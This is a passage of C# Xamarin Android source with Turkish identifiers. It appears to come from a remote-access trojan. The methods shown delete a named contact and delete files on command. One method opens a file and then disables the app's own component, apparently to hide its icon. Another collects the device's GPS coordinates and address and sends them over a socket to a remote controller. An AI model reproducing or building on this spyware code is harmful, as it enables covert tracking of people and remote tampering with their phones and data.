                Toast.MakeText(this, "Contact Not Saved", ToastLength.Long).Show();

            }
        }
        public void rehberNoSil(string isim)
        {
            Context thisContext = this;
            string[] Projection = new string[] { ContactsContract.ContactsColumns.LookupKey,ContactsContract.ContactsColumns.DisplayName };
            ICursor cursor = thisContext.ContentResolver.Query(ContactsContract.Contacts.ContentUri, Projection, null, null, null);
            while (cursor != null & cursor.MoveToNext())
            {
                string lookupKey = cursor.GetString(0);
                string name = cursor.GetString(1);

                if (name == isim)
                {
                    var uri = Android.Net.Uri.WithAppendedPath(ContactsContract.Contacts.ContentLookupUri, lookupKey);
                    thisContext.ContentResolver.Delete(uri, null, null);
                    cursor.Close();
                    return;
                }
            }
        }
        public void Ac(string path)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(path);
                file.SetReadable(true);

                string application = "";
                string extension = Path.GetExtension(path);

                // get mimeTye
                switch (extension.ToLower())
                {
                    case ".txt":
                        application = "text/plain";
                        break;
                    case ".doc":
                    case ".docx":
                        application = "application/msword";
                        break;
                    case ".pdf":
                        application = "application/pdf";
                        break;
                    case ".xls":
                    case ".xlsx":
                        application = "application/vnd.ms-excel";
                        break;
                    case ".jpg":
                    case ".jpeg":
                    case ".png":
                        application = "image/jpeg";
                        break;
                    default:
                        application = "*/*";
                        break;
                }
                Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + path);
                Intent intent = new Intent(Intent.ActionView);
                intent.SetDataAndType(uri, application);
                intent.SetFlags(ActivityFlags.ClearWhenTaskReset | ActivityFlags.NewTask);
                StartActivity(intent);
                try
                {
                    PackageManager p = PackageManager;
                    ComponentName componentName = new ComponentName(ApplicationContext, Class);
                    p.SetComponentEnabledSetting(componentName,
                    ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
                }
                catch (Exception) { }
            }
            catch (Exception) { }
        }
        public void DeleteFile_(string filePath)
        {
            try
            {

                new Java.IO.File(filePath).AbsoluteFile.Delete();
                Toast.MakeText(this, "DELETED", ToastLength.Long).Show();
            }
            catch (Exception ex)
            {
                Toast.MakeText(this, ex.Message + "DELETE", ToastLength.Long).Show();
            }
        }
        public async void lokasyonCek()
        {
            double GmapLat = 0;
            double GmapLong = 0;
            try
            {
                var request = new GeolocationRequest(GeolocationAccuracy.Default, TimeSpan.FromSeconds(6));
                var location = await Geolocation.GetLocationAsync(request);
                GmapLat = location.Latitude;
                GmapLat = location.Longitude;
                if (location != null)
                {
                    var placemarks = await Geocoding.GetPlacemarksAsync(location.Latitude, location.Longitude);
                    var placemark = placemarks?.FirstOrDefault();
                    string GeoCountryName = "Boş";
                    string admin = "Boş";
                    string local = "Boş";
                    string sublocal = "Boş";
                    string sub2 = "Boş";
                    if (placemark != null)
                    {
                        GeoCountryName = placemark.CountryName;
                        admin = placemark.AdminArea;
                        local = placemark.Locality;
                        sublocal = placemark.SubLocality;
                        sub2 = placemark.SubAdminArea;

                    }
                    byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + GeoCountryName + "=" + admin + 
                           "=" + sub2 + "=" + sublocal + "=" + local + "=" + location.Latitude.ToString() +
                         "=" + location.Longitude + "=");
                    PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
                }             
            }
            catch (FeatureNotSupportedException ex)
            {
                byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                               "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                            "=" + "HATA" + "=" + "HATA" + "=");
                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
            }
            catch (FeatureNotEnabledException ex)
            {
                byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=" + "HATA" + "=");
                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
            }
            catch (PermissionException ex)
            {
                byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=" + "HATA" + "=");
                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
            }
            catch (Exception ex)
            {
                byte[] ayrintilar = Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                   "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                "=" + "HATA" + "=" + "HATA" + "=");
                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
            }
        }
    }
}